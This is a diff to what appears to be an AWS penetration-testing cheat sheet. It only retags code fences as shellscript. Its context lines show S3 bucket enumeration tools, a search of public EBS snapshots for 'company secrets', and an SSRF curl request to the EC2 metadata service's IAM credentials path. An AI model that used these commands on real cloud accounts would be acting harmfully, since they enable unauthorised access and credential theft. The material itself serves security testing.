@@ -190,7 +190,7 @@ aws s3api head-object --bucket bucket-name --key file.txt # Check file metadata
 
 #### Find S3 buckets
 
-```
+```shellscript
 # Find buckets from keyword or company name
 # https://github.com/nahamsec/lazys3
 ruby lazys3.rb companyname
@@ -215,7 +215,7 @@ site:.s3.amazonaws.com "Company"
 
 #### Check S3 buckets perms and files
 
-```
+```shellscript
 # https://github.com/fellchase/flumberboozle/tree/master/flumberbuckets
 alias flumberbuckets='sudo python3 PATH/flumberboozle/flumberbuckets/flumberbuckets.py -p'
 echo "bucket" | flumberbuckets -si -
@@ -243,7 +243,7 @@ python3 aws_extender_cli.py -s S3 -b flaws.cloud
 
 #### **S3 examples attacks**
 
-```
+```shellscript
 # S3 Bucket Pillaging
 
 • GOAL: Locate Amazon S3 buckets and search them for interesting data
@@ -310,7 +310,7 @@ done
 
 #### Basic commands
 
-```
+```shellscript
 # ~/.aws/credentials
 [default]
 aws_access_key_id = XXX
@@ -491,7 +491,7 @@ iam:AddUserToGroup
 
 #### **EBS attack example**
 
-```
+```shellscript
 # Discover EBS Snapshot and mount it to navigate
 - Obtaning public snapshot name
 aws ec2 describe-snapshots --region us-east-1 --restorable-by-user-ids all | grep -C 10 "company secrets"
@@ -517,7 +517,7 @@ cd /mnt/home/user/companydata
 
 #### **EC2 basic commands**
 
-```
+```shellscript
 # Like traditional host
 - Port enumeration
 - Attack interesting services like ssh or rdp
@@ -541,7 +541,7 @@ aws ec2 describe-security-groups --filters Name=ip-permission.cidr,Values='0.0.0
 
 #### **EC2 example attacks**
 
-````
+````shellscript
 # SSRF to http://169.254.169.254 (Metadata server)
 curl http://<ec2-ip-address>/\?url\=http://169.254.169.254/latest/meta-data/iam/security-credentials/
 http://169.254.169.254/latest/meta-data
@@ -652,7 +652,7 @@ python cloudfrunt.py -o cloudfrunt.com.s3-website-us-east-1.amazonaws.com -i S3-
 
 #### **Info**
 
-```
+```shellscript
 # Welcome to serverless!!!!
 # AWS Lambda, essentially are short lived servers that run your function and provide you with output that can be then used in other applications or consumed by other endpoints.
 
